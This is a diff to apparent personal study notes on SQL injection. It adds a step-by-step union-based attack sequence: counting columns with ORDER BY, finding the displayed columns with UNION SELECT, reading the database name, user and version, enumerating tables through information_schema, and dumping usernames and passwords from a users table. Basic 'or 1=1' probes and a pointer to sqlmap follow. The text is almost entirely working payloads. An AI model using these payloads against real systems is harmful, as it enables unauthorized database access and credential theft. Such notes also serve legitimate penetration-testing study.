@@ -1,6 +1,27 @@
+UNION BASED SQLI
+
+  This will tell us how many columns there are by throwing an error at the first one that doesn't exist.
+' ORDER BY 1-- // == Output should look like 'Unknown column "6"' == Tells us there are 5 columns
+
+  Following command will show which columns are displayed
+%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
+
+  Try then running this, make sure first column is null because that column is usually reserved.
+' UNION SELECT null, null, database(), user(), @@version  -- //
+
+  This command finds tables
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+
+  Able to run commands like this
+' UNION SELECT null, username, password, description, null FROM users -- //
+
+
+BASIC SQLI
+
 find if field is vulnerable
 
-' or 1=1-- -
+' or 1=1 -- // 
+' OR 1=1 in (SELECT * FROM users) -- //
 
 next use sqlmap
 
